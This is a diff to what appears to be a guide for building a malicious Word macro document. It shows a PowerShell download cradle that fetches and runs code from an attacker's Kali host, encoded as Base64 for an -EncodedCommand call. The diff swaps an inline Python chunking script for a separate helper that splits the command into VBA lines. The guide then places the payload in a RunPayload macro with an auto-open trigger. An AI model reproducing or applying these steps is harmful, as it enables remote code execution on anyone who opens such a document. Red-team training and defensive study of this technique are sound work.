@@ -51,18 +51,14 @@ printf '%s' "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_I
   | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 ```
 
-Long encoded commands need VBA-sized chunks. Replace `PASTE_BASE64_HERE` with the Base64 output; this prints assignment lines for a standard VBA module:
+Long encoded commands need VBA-sized chunks. From the repository root, run the [VBA chunk script](../scripts/vba_chunks.py):
 
 ```bash
-python3 - <<'PY'
-encoded = 'PASTE_BASE64_HERE'
-if encoded == 'PASTE_BASE64_HERE':
-    raise SystemExit('Replace PASTE_BASE64_HERE with the generated Base64 first')
-command = 'powershell.exe -NoProfile -EncodedCommand ' + encoded
-for offset in range(0, len(command), 50):
-    print('    cmd = cmd & "' + command[offset:offset + 50] + '"')
-PY
+# Paste the Base64 value when prompted; copy the printed VBA lines into RunPayload.
+python3 scripts/vba_chunks.py
 ```
+
+You can also pipe the encoding command above directly into `python3 scripts/vba_chunks.py` instead of copying the Base64 manually.
 
 In Word, place `RunPayload` and **one** open trigger in a standard module. Paste every generated `cmd = cmd & ...` line where indicated. Save as macro-enabled `.docm` (or legacy `.doc`).
 
